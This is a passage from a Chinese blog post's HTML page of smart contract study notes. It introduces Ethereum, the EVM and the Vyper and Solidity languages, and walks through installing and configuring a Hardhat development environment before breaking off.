<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/favicon.ico" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"hasegawaazusa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="有关智能合约的简要笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="智能合约笔记">
<meta property="og:url" content="https://hasegawaazusa.github.io/smart-contract-note.html">
<meta property="og:site_name" content="独奏の小屋">
<meta property="og:description" content="有关智能合约的简要笔记">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hasegawaazusa.github.io/smart-contract-note/hardhat%E5%8F%AF%E8%83%BD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png">
<meta property="og:image" content="https://hasegawaazusa.github.io/smart-contract-note/private_member.png">
<meta property="og:image" content="https://hasegawaazusa.github.io/smart-contract-note/overflow.png">
<meta property="og:image" content="https://hasegawaazusa.github.io/smart-contract-note/overflow-1709277023926-3.png">
<meta property="article:published_time" content="2023-04-24T11:00:00.000Z">
<meta property="article:modified_time" content="2024-03-18T13:45:07.052Z">
<meta property="article:author" content="qsdz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hasegawaazusa.github.io/smart-contract-note/hardhat%E5%8F%AF%E8%83%BD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png">


<link rel="canonical" href="https://hasegawaazusa.github.io/smart-contract-note.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hasegawaazusa.github.io/smart-contract-note.html","path":"/smart-contract-note.html","title":"智能合约笔记"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>智能合约笔记 | 独奏の小屋</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">独奏の小屋</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">65</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">129</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6"><span class="nav-number">1.</span> <span class="nav-text">智能合约</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.</span> <span class="nav-text">开发环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hardhat"><span class="nav-number">1.2.1.</span> <span class="nav-text">Hardhat</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A5%E9%97%A8"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">入门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">任务</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%B7%E9%98%B1"><span class="nav-number">1.3.</span> <span class="nav-text">陷阱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E7%A7%81%E6%80%A7"><span class="nav-number">1.3.1.</span> <span class="nav-text">隐私性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%80%E8%B0%93private"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">所谓private</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E6%8F%92%E6%A7%BD"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">存储插槽</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#solidity"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">Solidity</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A7%84%E5%88%99"><span class="nav-number">1.3.1.3.1.</span> <span class="nav-text">规则</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E7%B4%A7%E7%BC%A9"><span class="nav-number">1.3.1.3.2.</span> <span class="nav-text">存储紧缩</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9A%E9%95%BF%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.1.3.3.</span> <span class="nav-text">定长数组类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E5%AE%9A%E9%95%BF%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.1.3.4.</span> <span class="nav-text">不定长数组类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%98%A0%E5%B0%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.1.3.5.</span> <span class="nav-text">映射类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#bytes-%E5%92%8C-string"><span class="nav-number">1.3.1.3.6.</span> <span class="nav-text">bytes 和 string</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vyper"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">Vyper</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9A%E9%95%BF%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B-1"><span class="nav-number">1.3.1.4.1.</span> <span class="nav-text">定长数组类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#bytes-%E5%92%8C-string-1"><span class="nav-number">1.3.1.4.2.</span> <span class="nav-text">Bytes 和 String</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84"><span class="nav-number">1.3.1.4.3.</span> <span class="nav-text">动态数组</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%98%A0%E5%B0%84%E7%B1%BB%E5%9E%8B-1"><span class="nav-number">1.3.1.4.4.</span> <span class="nav-text">映射类型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%8F%E6%9C%BA%E6%80%A7"><span class="nav-number">1.3.2.</span> <span class="nav-text">随机性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vyper-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">Vyper 全局变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#solidity-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">Solidity 全局变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chainlink-vrf"><span class="nav-number">1.3.2.5.</span> <span class="nav-text">Chainlink VRF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%85%A5"><span class="nav-number">1.3.3.</span> <span class="nav-text">重入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%97%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.3.4.</span> <span class="nav-text">算数溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="nav-number">1.3.5.</span> <span class="nav-text">身份验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%98%A0%E5%B0%84"><span class="nav-number">1.3.6.</span> <span class="nav-text">清除映射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8D%E6%95%B0%E6%8D%AE%E9%9A%90%E5%8C%BF"><span class="nav-number">1.3.7.</span> <span class="nav-text">位数据隐匿</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8"><span class="nav-number">1.3.8.</span> <span class="nav-text">委托调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A9%E9%99%8D%E6%A8%AA%E8%B4%A2"><span class="nav-number">1.3.9.</span> <span class="nav-text">天降横财</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#selfdestruct"><span class="nav-number">1.3.9.1.</span> <span class="nav-text">selfdestruct</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E5%AF%BC%E5%85%A5"><span class="nav-number">1.3.9.2.</span> <span class="nav-text">预导入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%8B%E4%B8%8D%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="nav-number">1.3.10.</span> <span class="nav-text">看不见的代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9C%9C%E7%BD%90"><span class="nav-number">1.3.11.</span> <span class="nav-text">蜜罐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%B0%8F"><span class="nav-number">1.3.12.</span> <span class="nav-text">合约代码大小</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A5%E5%8F%A3"><span class="nav-number">1.4.</span> <span class="nav-text">接口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#erc20"><span class="nav-number">1.4.1.</span> <span class="nav-text">ERC20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#erc721"><span class="nav-number">1.4.2.</span> <span class="nav-text">ERC721</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#erc4626"><span class="nav-number">1.4.3.</span> <span class="nav-text">ERC4626</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%91%E6%B4%9E"><span class="nav-number">1.5.</span> <span class="nav-text">脑洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msb"><span class="nav-number">1.5.1.</span> <span class="nav-text">MSB</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%BB%E5%A4%96%E9%9F%B3"><span class="nav-number">2.</span> <span class="nav-text">画外音</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A9%E8%AE%B0%E8%AF%8D"><span class="nav-number">2.1.</span> <span class="nav-text">助记词</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="qsdz"
      src="/images/android-chrome-144x144.png">
  <p class="site-author-name" itemprop="name">qsdz</p>
  <div class="site-description" itemprop="description">又菜又爱玩，望轻喷</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">129</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">65</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/HasegawaAzusa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HasegawaAzusa" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hasegawaazusa.github.io/smart-contract-note.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/android-chrome-144x144.png">
      <meta itemprop="name" content="qsdz">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="独奏の小屋">
      <meta itemprop="description" content="又菜又爱玩，望轻喷">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="智能合约笔记 | 独奏の小屋">
      <meta itemprop="description" content="有关智能合约的简要笔记">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          智能合约笔记
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-04-24 19:00:00" itemprop="dateCreated datePublished" datetime="2023-04-24T19:00:00+08:00">2023-04-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-03-18 21:45:07" itemprop="dateModified" datetime="2024-03-18T21:45:07+08:00">2024-03-18</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>37k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>34 分钟</span>
    </span>
</div>

            <div class="post-description">有关智能合约的简要笔记</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="智能合约">智能合约</h1>
<h2 id="前言">前言</h2>
<p>以太坊是一个<strong>基于区块链技术</strong>的开源平台，它允许开发者<strong>构建和部署智能合约以及分散式应用程序（DApp）</strong>。</p>
<p>以太坊的区块链提供了一个去中心化的环境，使得<strong>交易和数据</strong>可以在整个网络上进行验证和记录，而不需要信任中心化的机构。</p>
<p>合约是以太坊应用程序的基本构建块，所有变量和函数都属于合约。</p>
<p>智能合约是以太坊的重要特性之一，它们是一种自动执行的合约代码，通过以太坊网络上的节点来执行，并且具有在没有第三方干预的情况下执行交易和合约的能力。</p>
<blockquote>
<p>此行之后的<strong>以太坊</strong>可能指代<strong>以太坊区块链</strong>、<strong>以太坊网络</strong>或<strong>以太坊开发平台</strong>，有时需加以区分。</p>
<p>而区块链一般仅指<strong>以太坊区块链</strong>。</p>
</blockquote>
<p>如果在此对以太坊没有概念，可以粗略将以太坊理解为一个<strong>世界计算机</strong>，你可以在编写<strong>智能合约代码</strong>在这个世界计算机中运行。</p>
<p>但是需要注意的是，这个<strong>世界计算机</strong>所有人都可以使用、维护和参与其中，所以它是<strong>去中心化的</strong>，所有在这上面的<strong>交互</strong>（交易）、<strong>程序</strong>（智能合约代码）和<strong>状态</strong>都可以被所有人查看。</p>
<p>同时由于这个<strong>世界计算机</strong>由所有人参与其中，所以与其进行交互时需要给予一定的<strong>使用费</strong>（gas），这同时也是以太坊中确保安全性和有效性的关键之一。</p>
<blockquote>
<p>一个公开的计算机需要付费使用，费用的一部分是给予<strong>维护者</strong>的奖励，这样将鼓励更多人参与对计算机进行维护。</p>
</blockquote>
<blockquote>
<p>有关区块链、以太坊等相关知识这里不再赘述。</p>
</blockquote>
<p>正如在你的计算机中运行 Java 代码需要使用 Java
虚拟机（JVM）一样，以太坊这个世界计算机想要运行智能合约代码时，需要使用<strong>以太坊虚拟机（EVM）</strong>。</p>
<p>但需要注意的是，以太坊虚拟机是<strong>基于栈的</strong>，这与 Python
的运行机制是类似的。</p>
<blockquote>
<p>如果不理解什么是基于栈的语言，什么是基于寄存器的语言，可以忽略。</p>
</blockquote>
<p>EVM 与 JVM
类似，其直接运行的是字节码（bytecode），但人类手编虚拟机字节码显然是过于夸张了，所以与
Java
类似的，一般的智能合约程序是使用智能合约语言进行编写，再由编译器进行编译成虚拟机可识别的字节码。</p>
<p>其中有两大智能合约高级语言：Vyper 和 Solidity。</p>
<p>Vyper 是 Pythonic
的智能合约语言，在这里强烈建议智能合约开发初学者优先学习，因为其语法简单易懂（前提是有一定
Python 和 C 基础），并且有优秀的教程和文档。</p>
<p>优秀的 Vyper 宝可梦教程：<a target="_blank" rel="noopener" href="https://learn.vyperlang.org/#/lessons.html">https://learn.vyperlang.org/#/lessons.html</a></p>
<p>优秀的 Vyper 官方文档：<a target="_blank" rel="noopener" href="https://docs.vyperlang.org/en/latest/index.html">https://docs.vyperlang.org/en/latest/index.html</a></p>
<p>唯一的缺点可能只有暂时没有中文文档。</p>
<p>在学习了 Vyper 后，最好学习了解
Solidity，因为这是以太坊开放平台的核心语言，由大部分以太坊开发人员参与维护，可以从
Solidity 的设计中窥见部分以太坊设计理念，对以太坊有更深刻的理解。</p>
<p>需要注意的是，Solidity 受到 C 和 C++
语法的深刻影响。为了实现更多的功能，开发人员在 Solidity
中引入了许多未经合理设计的语法，并且其中一部分语法与 EVM
运行机理有一定联系，学习起来可能较为困难。</p>
<blockquote>
<p>个人认为，Solidity 的语法设计过于繁杂，导致代码的可读性较低。可以将
Solidity 理解为普通计算机语言中的
C++，因为它们都遵循了零成本抽象的理念。而 Vyper
则更类似于普通计算机语言中的 Python。</p>
<p>随着 Vyper 的发展成熟，预计其在应用方面会比 Solidity 更加广泛。</p>
</blockquote>
<p>不过，Solidity 与 Vyper 在很大程度上有着强烈的相似之处。掌握了 Vyper
后，学习 Solidity 的难度会降低。</p>
<p>与 C 类似，Solidity
进行优化时通常是在汇编层面进行的。为了能够对代码进行优化，Solidity
引入了一种中间语言，即 Yul。Yul 可以被看作是 Solidity 与 EVM
字节码之间的桥梁，因此可以被称为 EVM 的汇编语言。</p>
<blockquote>
<p>同时 Solidity 是支持代码中内联汇编的，语法与 C 内联汇编类似。</p>
</blockquote>
<p>Yul 相较于 Solidity 是一种更加低级的语言，它内置了许多功能，这也是
Solidity 的优势之一。通过内联汇编的方式，Solidity 可以利用 Yul
实现更丰富的功能，从而提高了代码的灵活性和可扩展性。</p>
<p>所以如果碰到 Solidity 无法实现的功能，可以考虑学习 Yul。</p>
<blockquote>
<p>但是 Yul 并不是十分优化的，因为它内置了许多功能，可以参考文章 <a target="_blank" rel="noopener" href="https://blog.chain.link/solidity-vs-vyper/">https://blog.chain.link/solidity-vs-vyper/</a>，可以考虑学习
Huff 来进一步优化代码。</p>
</blockquote>
<p>编写和部署智能合约代码时，通常会使用 <a target="_blank" rel="noopener" href="https://remix.ethereum.org/">Remix IDE</a> 进行开发和测试。</p>
<p>而在与区块链交互时，通常会使用 Typescript 的 web3js 框架。</p>
<blockquote>
<p>虽然有 Python 版本的 web3py，但开发不完善，没能很好的用上 Python
的异步功能。</p>
</blockquote>
<blockquote>
<p>Remix 支持注入脚本运行 web3js 代码，脚本代码框架如下</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="comment">// to do something</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>在注释处编写代码，Remix 内置对象 <code>web3</code>，它将绑定
<code>DEPLOY &amp; RUN TRANSACTIONS</code>
插件的部分信息，无需手动绑定，便于测试和交互。</p>
</blockquote>
<h2 id="开发环境">开发环境</h2>
<p>个人而言用得更顺手的是 Remix，但 Remix
注重合约开发、合约部署和合约间的交互，在面对一些外部与合约的交互时在测试上有些鸡肋。</p>
<p>故除了在线环境 Remix 外，还推荐本地环境 Hardhat。</p>
<h3 id="hardhat">Hardhat</h3>
<h4 id="安装">安装</h4>
<p>新建文件夹，初始化 node 环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> hardhat</span><br><span class="line"><span class="built_in">cd</span> hardhat</span><br><span class="line">npm init</span><br></pre></td></tr></table></figure>
<p>安装 Hardhat 和搭配使用的插件与包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox @nomicfoundation/hardhat-web3-v4 @nomiclabs/hardhat-vyper web3</span><br></pre></td></tr></table></figure>
<p>随后进行 Hardhat 环境的初始化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat init</span><br></pre></td></tr></table></figure>
<p>推荐选择 <code>Create a TypeScript project</code>，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ npx hardhat init</span><br><span class="line">888    888                      888 888               888</span><br><span class="line">888    888                      888 888               888</span><br><span class="line">888    888                      888 888               888</span><br><span class="line">8888888888  8888b.  888d888 .d88888 88888b.   8888b.  888888</span><br><span class="line">888    888     &quot;88b 888P&quot;  d88&quot; 888 888 &quot;88b     &quot;88b 888</span><br><span class="line">888    888 .d888888 888    888  888 888  888 .d888888 888</span><br><span class="line">888    888 888  888 888    Y88b 888 888  888 888  888 Y88b.</span><br><span class="line">888    888 &quot;Y888888 888     &quot;Y88888 888  888 &quot;Y888888  &quot;Y888</span><br><span class="line"></span><br><span class="line">👷 Welcome to Hardhat v2.20.1 👷‍</span><br><span class="line"></span><br><span class="line">? What do you want to do? …</span><br><span class="line">  Create a JavaScript project</span><br><span class="line">❯ Create a TypeScript project</span><br><span class="line">  Create a TypeScript project (with Viem)</span><br><span class="line">  Create an empty hardhat.config.js</span><br><span class="line">  Quit</span><br></pre></td></tr></table></figure>
<p>其余选项默认即可。</p>
<p>在初始化结束后，会得到 <code>hardhat.config.ts</code>
和目录若干。</p>
<p><code>hardhat.config.ts</code> 相当于 <code>vue</code> 中的
<code>main.ts</code>，是主入口，需要填写一些代码内容，可能的内容如下</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">HardhatUserConfig</span> &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat/config&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@nomicfoundation/hardhat-web3-v4&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@nomiclabs/hardhat-vyper&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Specify the compiler version, which needs to be changed in real time</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">HardhatUserConfig</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: <span class="string">&quot;0.8.24&quot;</span>,</span><br><span class="line">  <span class="attr">vyper</span>: <span class="string">&quot;0.3.8&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> config;</span><br></pre></td></tr></table></figure>
<p>目录下的初始文件删去即可。</p>
<blockquote>
<p>默认生成
<code>contracts/Lock.sol</code>，<code>scripts/deploy.ts</code>，<code>test/Lock.ts</code>。</p>
</blockquote>
<p>个人喜好的开发环境是以 Vyper 作为智能合约编译器，主要使用 Web3js
与以太坊进行交互。</p>
<h4 id="入门">入门</h4>
<p>Hardhat 的文件结构如下</p>
<figure>
